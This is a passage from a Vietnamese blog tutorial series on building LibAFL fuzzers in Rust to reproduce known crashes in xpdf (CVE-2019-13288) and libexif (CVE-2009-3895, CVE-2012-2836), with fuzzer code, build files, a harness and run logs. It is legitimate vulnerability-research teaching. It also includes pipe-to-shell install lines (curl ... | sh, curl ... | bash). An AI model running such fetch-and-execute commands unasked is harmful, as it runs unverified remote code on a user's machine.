TimeObserver lâu hơn so với thông thường thì có nghĩa là input của chúng ta có thể gây lỗi chương trình.\nSau khi đã tìm được input có khả năng gây lỗi cho chương trình thì chúng ta cần phải xác định chính xác xem input có thực sự gây crash cho file thực thi hay không. Lần này thay vì sử dụng logical OR để xác định thì mình sẽ sử dụng logical AND để kết hợp cả hai lại với nhau, bởi vì một input gây crash cho chương trình thì chắc chắn thời gian nó sẽ bị timeout và input sẽ khiến cho chương trình rẽ sang một hướng code khác trong coverage map.\nlet mut objective = feedback_and_fast!( // Must be a crash TimeoutFeedback::new(), // Take it only if trigger new coverage over crashes MaxMapFeedback::new(\u0026amp;edges_observer) Chúng ta di chuyển tới component State\n4th Component: State # Với component lần này thì mình sẽ sử dụng StdState. StdState sẽ xác định state cho fuzzer, random number generator, corpora.\nlet mut state = StdState::new( StdRand::with_seed(current_nanos()), // Corpus that will be evolved, we keep it in memory for performance corpus_BytesInput, // Corpus in which we store solutions (crashes in this example), // on disk so the user can get them after stopping the fuzzer crash_corpus, // States of the feedbacks. // The feedbacks can report the data that should persist in the State. \u0026amp;mut feedback, // Same for objective feedbacks \u0026amp;mut objective, ) .unwrap(); 5th Component: Monitor # Monitor sẽ theo dõi toàn bộ thông tin và đưa ra cách phù hợp nhất để có thể hiển thị các thông tin đó cho chúng ta.\nMình sẽ sử dụng SimpleMonitor, nó giống như printf trong C. Nó sẽ in ra các thông tin cho chúng ta trên terminal.\nlet monitor = SimpleMonitor::new(|s| println!(\u0026#34;{s}\u0026#34;)); 6th Component: EventManager # Component này tương tự với Monitor, nó sẽ xử lý các Events trong quá trình fuzzing, ví dụ như là updating Monitor Component, logging và tìm các testcase khả nghi.\nSimplest Methods as always\nlet mut mgr = SimpleEventManager::new(monitor); 7th Component: Scheduler # Trong quá trình fuzzing chúng ta cần phải đưa vào các testcases khác nhau từ corpus thì Scheduler sẽ đảm nhận vai trò này. Nó sẽ tạo ra các testcase mới phù hợp cho strategy của fuzzer từ corpus. Để ưu tiên các testcase \u0026ldquo;nhỏ, gọn\u0026rdquo; để tối ưu thời gian fuzzing thì mình sử dụng strategy IndexesLenTimeMinimizerScheduler giống như trong concept của forkserver_simple.\nlet scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); 8th Component: Fuzzer # Đối với component này mình chọn TimeoutForkserverExecutor. \u0026ldquo;Timeout forkserver\u0026rdquo; bao bọc quanh trình thực thi standard ForkserverExecutor và thiết lập một thời gian chờ trước mỗi lần chạy. Có nghĩa trước khi chạy thì nó sẽ set timeout để có thể fork một process khác để fuzz.\nChúng ta cần phải chỉ ra những gì mà chúng ta muốn thực thi cho Executor. Ở đây đó là\nexercise-1/xpdf/xpdf/install/bin/pdftotext PDF-FILE let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); let mut forkserver = ForkserverExecutor::builder() .program(\u0026#34;./xpdf/xpdf/install/bin/pdftotext\u0026#34;) .parse_afl_cmdline([\u0026#34;@@\u0026#34;]) //Lí do có @@ ở đây đó chính là chỉ định cho ForkserverExecutor rằng chúng ta sử dụng BytesInput .coverage_map_size(MAP_SIZE) .build(tuple_list!(timeObserver, edges_observer)) .unwrap(); let timeout = Duration::from_secs(5); //Chúng ta set timeout 5 giây let mut executor = TimeoutForkserverExecutor::new(forkserver, timeout).unwrap(); Và chúng ta đi tới component cuối cùng: Mutator + Stage\n9th Component: Mutator + Stage # Mutator như trong docs nói thì nó đơn giản chỉ nhận input vào và mutate nó. Và để chọn cho mutational stage thì mình sử dụng Havoc Mutation.\nlet mutator = StdScheduledMutator::new(havoc_mutations()); let mut stages = tuple_list!(StdMutationalStage::new(mutator)); main.rs\nuse core::time::Duration; use std::path::PathBuf; use libafl::{ corpus::{Corpus, InMemoryCorpus, OnDiskCorpus}, events::SimpleEventManager, executors::{ForkserverExecutor, TimeoutForkserverExecutor}, feedback_and_fast, feedback_or, Error, Fuzzer, StdFuzzer, feedbacks::{MaxMapFeedback, TimeFeedback, TimeoutFeedback}, inputs::BytesInput, monitors::SimpleMonitor, mutators::{havoc_mutations, StdScheduledMutator}, observers::{HitcountsMapObserver, StdMapObserver, TimeObserver}, schedulers::{IndexesLenTimeMinimizerScheduler, QueueScheduler}, stages::mutational::StdMutationalStage, state::{HasCorpus, StdState}, }; use libafl::bolts::{ current_nanos, rands::StdRand, shmem::{ShMem, ShMemProvider, StdShMemProvider}, tuples::{tuple_list, MatchName, Merge}, AsMutSlice, Truncate, }; const MAP_SIZE: usize = 65536; fn main() -\u0026gt; Result\u0026lt;(), Error\u0026gt; { let corpus_directory = vec![PathBuf::from(\u0026#34;./corpus\u0026#34;)]; let corpus_BytesInput = InMemoryCorpus::\u0026lt;BytesInput\u0026gt;::new(); let crash_corpus = OnDiskCorpus::new(PathBuf::from(\u0026#34;./crash\u0026#34;))?; let time_observer = TimeObserver::new(\u0026#34;time\u0026#34;); let mut shmem_provider = StdShMemProvider::new().unwrap(); let mut shmem = shmem_provider.new_shmem(MAP_SIZE).unwrap(); shmem.write_to_env(\u0026#34;__AFL_SHM_ID\u0026#34;).unwrap(); let shmem_buf = shmem.as_mut_slice(); let edges_observer = unsafe { HitcountsMapObserver::new(StdMapObserver::new(\u0026#34;shared_mem\u0026#34;, shmem_buf)) }; let mut feedback = feedback_or!( MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), TimeFeedback::with_observer(\u0026amp;time_observer) ); let mut objective = feedback_and_fast!( // Must be a crash TimeoutFeedback::new(), // Take it only if trigger new coverage over crashes // Uses `with_name` to create a different history from the `MaxMapFeedback` in `feedback` above MaxMapFeedback::new(\u0026amp;edges_observer) ); let mut state = StdState::new( StdRand::with_seed(current_nanos()), // Corpus that will be evolved, we keep it in memory for performance corpus_BytesInput, // Corpus in which we store solutions (crashes in this example), // on disk so the user can get them after stopping the fuzzer crash_corpus, // States of the feedbacks. // The feedbacks can report the data that should persist in the State. \u0026amp;mut feedback, // Same for objective feedbacks \u0026amp;mut objective, ) .unwrap(); let monitor = SimpleMonitor::new(|s| println!(\u0026#34;{s}\u0026#34;)); let mut mgr = SimpleEventManager::new(monitor); let scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); let mut forkserver = ForkserverExecutor::builder() .program(\u0026#34;./xpdf/install/bin/pdftotext\u0026#34;) .parse_afl_cmdline([\u0026#34;@@\u0026#34;]) //Lí do có @@ ở đây đó chính là chỉ định cho ForkserverExecutor rằng chúng ta sử dụng BytesInput .coverage_map_size(MAP_SIZE) .build(tuple_list!(time_observer, edges_observer)) .unwrap(); let timeout = Duration::from_secs(5); //Chúng ta set timeout 5 giây let mut executor = TimeoutForkserverExecutor::new(forkserver, timeout).unwrap(); if state.corpus().count() \u0026lt; 1 { state .load_initial_inputs(\u0026amp;mut fuzzer, \u0026amp;mut executor, \u0026amp;mut mgr, \u0026amp;corpus_directory) .unwrap_or_else(|err| { panic!( \u0026#34;Failed to load initial corpus at {:?}: {:?}\u0026#34;, \u0026amp;corpus_directory, err ) }); println!(\u0026#34;We imported {} inputs from disk.\u0026#34;, state.corpus().count()); } let mutator = StdScheduledMutator::new(havoc_mutations()); let mut stages = tuple_list!(StdMutationalStage::new(mutator)); fuzzer .fuzz_loop(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr) .expect(\u0026#34;Error in the fuzzing loop\u0026#34;); Ok(()) } Fuzz\u0026rsquo;em All # Sau khi đã hoàn thành build các component thì chúng ta thực hiện fuzz. Trong fuzzer thì chúng ta sẽ truyền vào các component cần thiết như là: stages, executor, state, event manager.\nfuzzer .fuzz_loop(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr) .expect(\u0026#34;Error in the fuzzing loop\u0026#34;); Build fuzzer # Bởi vì trong file Makefile.toml mình đã đưa vào task cargo build nên nó sẽ tự động chạy fuzzing cho mình.\ncd ~/fuzzing-101/exercise-1 cargo build --release Sau khi build xong thì file thực thi\nAnd the magic happen # ../target/release/exercise-one-solution Result\n[Testcase #0] run time: 0h-15m-18s, clients: 1, corpus: 1230, objectives: 1, executions: 666438, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1230, objectives: 1, executions: 666835, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1230, objectives: 1, executions: 666835, exec/sec: 725.3 [Testcase #0] run time: 0h-15m-19s, clients: 1, corpus: 1231, objectives: 1, executions: 667085, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1231, objectives: 1, executions: 667085, exec/sec: 725.4 [Testcase #0] run time: 0h-15m-19s, clients: 1, corpus: 1232, objectives: 1, executions: 667180, exec/sec: 725.5 [Stats #0] run time: 0h-15m-21s, clients: 1, corpus: 1232, objectives: 1, executions: 667180, exec/sec: 723.7 [Testcase #0] run time: 0h-15m-21s, clients: 1, corpus: 1233, objectives: 1, executions: 668717, exec/sec: 725.4 [Stats #0] run time: 0h-15m-30s, clients: 1, corpus: 1233, objectives: 1, executions: 668717, exec/sec: 718.6 [Testcase #0] run time: 0h-15m-30s, clients: 1, corpus: 1234, objectives: 1, executions: 675056, exec/sec: 725.5 [Stats #0] run time: 0h-15m-34s, clients: 1, corpus: 1234, objectives: 1, executions: 677239, exec/sec: 725.0 Sample gây crash được tạo ra từ fuzzer ./xpdf/install/bin/pdftotext crash/067cae960270b247 Conclusion # Sau khi chạy cỡ 15p (tùy máy) thì đã có 1 file đạt được mục đích của chúng ta với bằng chứng là objectives: 1 được in ra từ component Monitor. Mình nghĩ là có cách để tối ưu thời gian hơn, mình tìm hiểu thì sử dụng afl-clang-cto thay vì afl-clang-fast và sử dụng in-process executor thay vì là forkserver.\nNếu như bạn có câu hỏi thì hay dm cho mình\nTwitter: @y198_nt Discord: y198#6338\nThank you for reading 🫶\n","date":"27 November 2023","externalUrl":null,"permalink":"/posts/fuzzing_holy_bible_chapter1/","section":"Posts","summary":"Using LibAFL fuzzer to reproduce CVE-2019-13288","title":"LibAFL Fuzzing Holy Bible - Chapter I: Fuzzing Xpdf - CVE-2019-13288","type":"posts"},{"content":" tags: libafl # Background # Antonio Morales đã tạo một cái repo Fuzzing 101 với mục đích là tạo ra các challenge liên quan đến những kiến thức và basic skill của fuzzing dành cho những ai muốn học nó và sử dụng nó để tìm ra các vulnerabilities. Repo này tập trung vào cách sử dụng của AFL++ nhưng trong series mình viết với mục đích là solve những challenge sử dụng LibAFL thay vì là AFL++.\nTrong series này thì mình sẽ tìm hiểu các thư viện và viết fuzzers bằng ngôn ngữ Rust, mình sẽ cố gắng solve các challenges gần giống với solution nhất mà mình có thể làm được.\nVà trong series này mình sẽ sử dụng ngôn ngữ Rust để viết fuzzers. Nếu như bạn chưa biết Rust và Fuzzers là gì thì mình khuyến khích bạn nên tìm hiểu về nó trước khi đọc những gì tiếp theo.\nAbout LibAFL # LibAFL là một sự cải tiến từ AFL++ được viết bằng ngôn ngữ Rust. Nó nhanh hơn, đa dạng nền tảng, no_std compatibles và nó tận dụng tốt nguồn tài nguyên của máy.\nĐể hiểu rõ hơn về LibAFL bạn có thể coi cái này Fuzzers Like Lego @rC3\nPrequesite # Rust installation: # curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\nAFL++ installation: # Dependencies: sudo apt-get update sudo apt-get install -y python3-pip cmake build-essential git gcc sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev # try to install llvm 14 and install the distro default if that fails sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-dev sudo apt-get install -y ninja-build # for QEMU mode Build AFL++: git clone https://github.com/AFLplusplus/AFLplusplus \u0026amp;\u0026amp; cd AFLplusplus export LLVM_CONFIG=\u0026#34;llvm-config-15\u0026#34; make distrib sudo make install Nếu như bạn gặp lỗi với unicornafl thì hãy thử downgrade version của python xuống 3.10.8.\ncurl https://pyenv.run | bash pyenv install 3.10.8 pyenv global 3.10.8 Test installation: cd ~ export PATH=$PATH :~/AFLplusplus afl-fuzz -h Result:\ngh0st@pl4y-Gr0und:~$ afl-fuzz -h afl-fuzz++4.09a based on afl by Michal Zalewski and a large online community afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parameters: -i dir - input directory with test cases (or \u0026#39;-\u0026#39; to resume, also see AFL_AUTORESUME) -o dir - output directory for fuzzer findings Execution control settings: -P strategy - set fix mutation strategy: explore (focus on new coverage), exploit (focus on triggering crashes). You can also set a number of seconds after without any finds it switches to exploit mode, and back on new coverage (default: 1000) -p schedule - power schedules compute a seed\u0026#39;s performance score: fast(default), explore, exploit, seek, rare, mmopt, coe, lin quad -- see docs/FAQ.md for more information -f file - location read by the fuzzed program (default: stdin or @@) -t msec - timeout for each run (auto-scaled, default 1000 ms). Add a \u0026#39;+\u0026#39; to auto-calculate the timeout, the value being the maximum. -m megs - memory limit for child process (0 MB, 0 = no limit [default]) -O - use binary-only instrumentation (FRIDA mode) -Q - use binary-only instrumentation (QEMU mode) -U - use unicorn-based instrumentation (Unicorn mode) -W - use qemu-based instrumentation with Wine (Wine mode) -X - use VM fuzzing (NYX mode - standalone mode) -Y - use VM fuzzing (NYX mode - multiple instances mode) Mutator settings: -a - target input format, \u0026#34;text\u0026#34; or \u0026#34;binary\u0026#34; (default: generic) -g minlength - set min length of generated fuzz input (default: 1) -G maxlength - set max length of generated fuzz input (default: 1048576) -D - enable deterministic fuzzing (once per queue entry) -L minutes - use MOpt(imize) mode and set the time limit for entering the pacemaker mode (minutes of no new finds). 0 = immediately, -1 = immediately and together with normal mutation. Note: this option is usually not very effective -c program - enable CmpLog by specifying a binary compiled for it. if using QEMU/FRIDA or the fuzzing target is compiled for CmpLog then use \u0026#39;-c 0\u0026#39;. To disable Cmplog use \u0026#39;-c -\u0026#39;. -l cmplog_opts - CmpLog configuration values (e.g. \u0026#34;2ATR\u0026#34;): 1=small files, 2=larger files (default), 3=all files, A=arithmetic solving, T=transformational solving, X=extreme transform solving, R=random colorization bytes. Fuzzing behavior settings: -Z - sequential queue selection instead of weighted random -N - do not unlink the fuzzing input file (for devices etc.) -n - fuzz without instrumentation (non-instrumented mode) -x dict_file - fuzzer dictionary (see README.md, specify up to 4 times) Test settings: -s seed - use a fixed seed for the RNG -V seconds - fuzz for a specified time then terminate -E execs - fuzz for an approx. no. of total executions then terminate Note: not precise and can have several more executions. Other stuff: -M/-S id - distributed mode (-M sets -Z and disables trimming) see docs/fuzzing_in_depth.md#c-using-multiple-cores for effective recommendations for parallel fuzzing. -F path - sync to a foreign fuzzer queue directory (requires -M, can be specified up to 32 times) -T text - text banner to show on the screen -I command - execute this command/script when a new crash is found -C - crash exploration mode (the peruvian rabbit thing) -b cpu_id - bind the fuzzing process to the specified CPU core (0-...) -e ext - file extension for the fuzz test input file (if needed) To view also the supported environment variables of afl-fuzz please use \u0026#34;-hh\u0026#34;. Compiled with Python 3.11.4 module support, see docs/custom_mutators.md Compiled without AFL_PERSISTENT_RECORD support. Compiled with shmat support. For additional help please consult docs/README.md :) Objective # Ở chapter lần này tương ứng với exercise-2 trong Fuzzing 101. Mục đích của exercise này đó là chúng ta cần phải tìm một cái PoC/crash cho CVE-2009-3895 \u0026amp; CVE-2012-2836.\nCVE-2009\nHeap-based buffer overflow in the exif_entry_fix function (aka the tag fixup routine) in libexif/exif-entry.c in libexif 0.6.18 allows remote attackers to cause a denial of service or possibly execute arbitrary code via an invalid EXIF image. NOTE: some of these details are obtained from third party information.\nCVE-2012-2836\nThe exif_data_load_data function in exif-data.c in the EXIF Tag Parsing Library (aka libexif) before 0.6.21 allows remote attackers to cause a denial of service (out-of-bounds read) or possibly obtain sensitive information from process memory via crafted EXIF tags in an image.\nBefore Fuzzing # Trước khi bắt đầu fuzzing chúng ta cần phải chuẩn bị một số thứ\nSetup our target # gh0st@fuzzing-bible:~/fuzzing-101-solutions$ cargo new --lib exercise-2 Chúng ta update member cho file Cargo.toml gốc\nfuzzing-101-solutions/Cargo.toml\n[workspace] members = [ \u0026#34;exercise-1\u0026#34;, \u0026#34;exercise-2\u0026#34;, ] Install libexif # gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ tar -xvf libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ rm libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ mv libexif-libexif-0_6_14-release libexif Install requirements\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ sudo apt-get install autopoint libtool gettext libpopt-dev Build our target # Lần này mình tiếp tục sử dụng Makefile.toml vì sự tiện lợi của nó trong việc build những task mình cần cho fuzzing\nNếu bạn chưa biết Makefile.toml là gì thì mình suggest bạn xem blog trước của mình, mình nói khá kỹ về tool này https://hackmd.io/jW6RBTbjTfqjGxRvR-DiLQ#Makefiletoml\n[tasks.clean] dependencies = [\u0026#34;cargo-clean\u0026#34;, \u0026#34;libexif-clean\u0026#34;, \u0026#34;build-clean\u0026#34;] [tasks.cargo-clean] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;clean\u0026#34;] [tasks.libexif-clean] command = \u0026#34;make\u0026#34; args = [\u0026#34;-C\u0026#34;, \u0026#34;libexif\u0026#34;, \u0026#34;clean\u0026#34;, \u0026#34;-i\u0026#34;] [tasks.build-clean] command = \u0026#34;rm\u0026#34; args = [\u0026#34;-rf\u0026#34;, \u0026#34;build/\u0026#34;] [tasks.build] dependencies = [\u0026#34;clean\u0026#34;, \u0026#34;build-libexif\u0026#34;] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;build\u0026#34;] [tasks.build-libexif] cwd = \u0026#34;libexif\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; autoreconf -fi ./configure --enable-shared=no --prefix=\u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/../build/\u0026#34; make -i make install -i \u0026#34;\u0026#34;\u0026#34; Run the build\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ cargo make build Confirm build thành công\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ ls build/lib/libexif.a build/lib/libexif.a Get into fuzzing # Setting up fuzzer # ~/fuzzing-101-solutions/exercise-2/Cargo.toml\n[dependencies] libafl = {version = \u0026#34;0.10.1\u0026#34;} libafl_cc = {version = \u0026#34;0.10.1\u0026#34;} libafl_targets = {version = \u0026#34;0.10.1\u0026#34;, features = [ \u0026#34;libfuzzer\u0026#34;, \u0026#34;sancov_pcguard_hitcounts\u0026#34;, \u0026#34;sancov_cmplog\u0026#34;, ]} clap = \u0026#34;3.0.0-beta.5\u0026#34; [lib] name=\u0026#34;exercisetwo\u0026#34; crate-type=[\u0026#34;staticlib] Get some corpus # gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ mkdir corpus solutions Ở trong libexif repo họ để sẵn một số file jpg để làm test data, để thuận tiện thì chúng ta sẽ lấy các file jpg đó về làm test case cho fuzzer.\nfuzzing-101-solutions/exercise-2/corpus\ngit clone --no-checkout --filter=blob:none https://github.com/libexif/libexif.git fuzzing-101-solutions/exercise-2/corpus\ncd libexif git checkout master -- test/testdata fuzzing-101-solutions/exercise-2/corpus/libexif\nmv test/testdata/*.jpg ../ cd .. rm -rf libexif Và đây là những file để làm test case cho fuzzer\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2/corpus\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2/corpus$ ls -la total 72 drwxrwxr-x 2 gh0st gh0st 4096 Thg 12 29 14:55 . drwxrwxr-x 7 gh0st gh0st 4096 Thg 12 29 14:55 .. -rw-rw-r-- 1 gh0st gh0st 2026 Thg 12 29 14:54 canon_makernote_variant_1.jpg -rw-rw-r-- 1 gh0st gh0st 3978 Thg 12 29 14:54 fuji_makernote_variant_1.jpg -rw-rw-r-- 1 gh0st gh0st 2850 Thg 12 29 14:54 olympus_makernote_variant_2.jpg -rw-rw-r-- 1 gh0st gh0st 6140 Thg 12 29 14:54 olympus_makernote_variant_3.jpg -rw-rw-r-- 1 gh0st gh0st 11458 Thg 12 29 14:54 olympus_makernote_variant_4.jpg -rw-rw-r-- 1 gh0st gh0st 9604 Thg 12 29 14:54 olympus_makernote_variant_5.jpg -rw-rw-r-- 1 gh0st gh0st 1346 Thg 12 29 14:54 pentax_makernote_variant_2.jpg -rw-rw-r-- 1 gh0st gh0st 1918 Thg 12 29 14:54 pentax_makernote_variant_3.jpg -rw-rw-r-- 1 gh0st gh0st 9132 Thg 12 29 14:54 pentax_makernote_variant_4.jpg Executor # Đối với mỗi loại fuzzer, về concept của việc thực thi các đoạn mã cần fuzz dưới mỗi lần test sẽ khác nhau với mỗi loại fuzzer, ví dụ như đối với hypervisor-based fuzzer như là kAFL thì mỗi test case nó sẽ chạy dưới các snapshot. Đối với libAFL fuzzer mỗi lần chạy test case nó sẽ gọi hàm \u0026ldquo;harness\u0026rdquo;, có nghĩa là chúng ta gọi hàm cần fuzz trong file target với các tham số cụ thể dưới mỗi lần chạy fuzz.\nĐối với bài này thì chúng ta tiện hơn, vì trong test folder trong repo của libexif, họ đã viết 1 file harness cho chúng ta để test, test-fuzzer-persistent.c.\nNôm na trong file test-fuzzer-persistent.c thì nó được viết dành cho afl fuzzer, vậy nên chúng ta có thể sử dụng trực tiếp nó luôn.\n/**file test-fuzzer-persistent.c * from test-parse.c and test-mnote.c * * \\brief Persistent AFL fuzzing binary (reaches 4 digits execs / second) * * Copyright (C) 2007 Hans Ulrich Niedermann \u0026lt;gp@n-dimensional.de\u0026gt; * Copyright 2002 Lutz Mueller \u0026lt;lutz@users.sourceforge.net\u0026gt; * * This library is free software; you can redistribute it and/or * modify it under the terms of the GNU Lesser General Public * License as published by the Free Software Foundation; either * version 2 of the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU * Lesser General Public License for more details. * * You should have received a copy of the GNU Lesser General Public * License along with this library; if not, write to the * Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, * Boston, MA 02110-1301 USA. * * SPDX-License-Identifier: LGPL-2.0-or-later */ #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026#34;libexif/exif-data.h\u0026#34; #include \u0026#34;libexif/exif-loader.h\u0026#34; #include \u0026#34;libexif/exif-system.h\u0026#34; __AFL_FUZZ_INIT(); #undef USE_LOG #ifdef USE_LOG static void logfunc(ExifLog *log, ExifLogCode code, const char *domain, const char *format, va_list args, void *data) { fprintf( stderr, \u0026#34;test-fuzzer: code=%d domain=%s \u0026#34;, code, domain); vfprintf (stderr, format, args); fprintf (stderr, \u0026#34;\\n\u0026#34;); } #endif /** Callback function handling an ExifEntry. */ void content_foreach_func(ExifEntry *entry, void *callback_data); void content_foreach_func(ExifEntry *entry, void *UNUSED(callback_data)) { char buf[2001]; /* ensure \\0 */ buf[sizeof(buf)-1] = 0; buf[sizeof(buf)-2] = 0; exif_tag_get_name(entry-\u0026gt;tag); exif_format_get_name(entry-\u0026gt;format); exif_entry_get_value(entry, buf, sizeof(buf)-1); if (buf[sizeof(buf)-2] != 0) abort(); } /** Callback function handling an ExifContent (corresponds 1:1 to an IFD). */ void data_foreach_func(ExifContent *content, void *callback_data); void data_foreach_func(ExifContent *content, void *callback_data) { printf(\u0026#34; Content %p: ifd=%d\\n\u0026#34;, (void *)content, exif_content_get_ifd(content)); exif_content_foreach_entry(content, content_foreach_func, callback_data); } static int test_exif_data (ExifData *d) { unsigned int i, c; char v[1024]; ExifMnoteData *md; fprintf (stdout, \u0026#34;Byte order: %s\\n\u0026#34;, exif_byte_order_get_name (exif_data_get_byte_order (d))); md = exif_data_get_mnote_data (d); if (!md) { fprintf (stderr, \u0026#34;Could not parse maker note!\\n\u0026#34;); return 1; } exif_mnote_data_ref (md); exif_mnote_data_unref (md); c = exif_mnote_data_count (md); for (i = 0; i \u0026lt; c; i++) { const char *name = exif_mnote_data_get_name (md, i); if (!name) continue; exif_mnote_data_get_name (md, i); exif_mnote_data_get_title (md, i); exif_mnote_data_get_description (md, i); exif_mnote_data_get_value (md, i, v, sizeof (v)); } return 0; } /** Main program. */ int main(const int argc, const char *argv[]) { int\ti; ExifData\t*d; ExifLoader\t*loader = exif_loader_new(); unsigned int\txbuf_size; unsigned char\t*xbuf; FILE\t*f; struct\tstat stbuf; #ifdef USE_LOG ExifLog\t*log = exif_log_new (); exif_log_set_func(log, logfunc, NULL); #endif #ifdef __AFL_HAVE_MANUAL_CONTROL __AFL_INIT(); #endif unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF; // must be after __AFL_INIT // and before __AFL_LOOP! while (__AFL_LOOP(10000)) { int len = __AFL_FUZZ_TESTCASE_LEN; // don\u0026#39;t use the macro directly in a call! d = exif_data_new_from_data(buf, len); /* try the exif loader */ #ifdef USE_LOG exif_data_log (d, log); #endif exif_data_foreach_content(d, data_foreach_func, NULL); test_exif_data (d); xbuf = NULL; exif_data_save_data (d, \u0026amp;xbuf, \u0026amp;xbuf_size); free (xbuf); exif_data_set_byte_order(d, EXIF_BYTE_ORDER_INTEL); xbuf = NULL; exif_data_save_data (d, \u0026amp;xbuf, \u0026amp;xbuf_size); free (xbuf); exif_data_unref(d); #if 0 /* try the exif data writer ... different than the loader */ exif_loader_write(loader, buf, len); d = exif_loader_get_data(loader); exif_data_foreach_content(d, data_foreach_func, NULL); test_exif_data (d); exif_loader_unref(loader); exif_data_unref(d); #endif } return 0; } Tuy nhiên chúng ta cần sửa đổi một chút xíu để phù hợp với ngữ cảnh trong bài này.\nChúng ta cần phải sửa những lỗi liên quan tới các phiên bản khác nhau của libexif đang được sử dụng Loại bỏ afl macros, các hàm in ra output như exif_data_log, fprintf , printf, logfunc. Đổi tên hàm main thành LLVMFuzzerTestOneInput, mỗi lần chạy fuzz thì fuzzer sẽ gọi tới hàm callback LLVMFuzzerTestOneInput. Đối với hàm main thì mình sẽ để nó ở trong ifdef, endif vì chúng ta cần hàm main để đọc file corpus và gọi hàm LLVMFuzzerTestOneInput, hàm main sẽ được compile khi mà chúng ta đã chuẩn bị xong vì thế nên hàm main sẽ được đặt trong ifdef LLVMFuzzerTestOneInput.c\n#include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026#34;libexif/exif-data.h\u0026#34; #include \u0026#34;libexif/exif-loader.h\u0026#34; #define UNUSED(param) UNUSED_PARAM_##param __attribute__((unused)) // __AFL_FUZZ_INIT(); void content_foreach_func(ExifEntry *entry, void *callback_data); void content_foreach_func(ExifEntry *entry, void *UNUSED(callback_data)) { char buf[2001]; /* ensure \\0 */ buf[sizeof(buf)-1] = 0; buf[sizeof(buf)-2] = 0; exif_tag_get_name(entry-\u0026gt;tag); exif_format_get_name(entry-\u0026gt;format); exif_entry_get_value(entry, buf, sizeof(buf)-1); if (buf[sizeof(buf)-2] != 0) abort(); } /** Callback function handling an ExifContent (corresponds 1:1 to an IFD). */ void data_foreach_func(ExifContent *content, void *callback_data); void data_foreach_func(ExifContent *content, void *callback_data) { printf(\u0026#34; Content %p: ifd=%d\\n\u0026#34;, (void *)content, exif_content_get_ifd(content)); exif_content_foreach_entry(content, content_foreach_func, callback_data); } static int test_exif_data (ExifData *d) { unsigned int i, c; char v[1024]; ExifMnoteData *md; fprintf (stdout, \u0026#34;Byte order: %s\\n\u0026#34;, exif_byte_order_get_name (exif_data_get_byte_order (d))); md = exif_data_get_mnote_data (d); if (!md) { fprintf (stderr, \u0026#34;Could not parse maker note!\\n\u0026#34;); return 1; } exif_mnote_data_ref (md); exif_mnote_data_unref (md); c = exif_mnote_data_count (md); for (i = 0; i \u0026lt; c; i++) { const char *name = exif_mnote_data_get_name (md, i); if (!name) continue; exif_mnote_data_get_name (md, i); exif_mnote_data_get_title (md, i); exif_mnote_data_get_description (md, i); exif_mnote_data_get_value (md, i, v, sizeof (v)); } return 0; } // Main program. -\u0026gt; LLVMFuzzerTestOneInput int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size){ int\ti; ExifData\t*d; ExifLoader\t*loader = exif_loader_new(); unsigned int\txbuf_size; unsigned char\t*xbuf; FILE\t*f; struct\tstat stbuf; #ifdef USE_LOG ExifLog\t*log = exif_log_new (); exif_log_set_func(log, logfunc, NULL); #endif d = exif_data_new_from_data(data, size); /* try the exif loader */ #ifdef USE_LOG exif_data_log (d, log); #endif exif_data_foreach_content(d, data_foreach_func, NULL); test_exif_data (d); xbuf = NULL; exif_data_save_data (d, \u0026amp;xbuf, \u0026amp;xbuf_size); free (xbuf); exif_data_set_byte_order(d, EXIF_BYTE_ORDER_INTEL); xbuf = NULL; exif_data_save_data (d, \u0026amp;xbuf, \u0026amp;xbuf_size); free 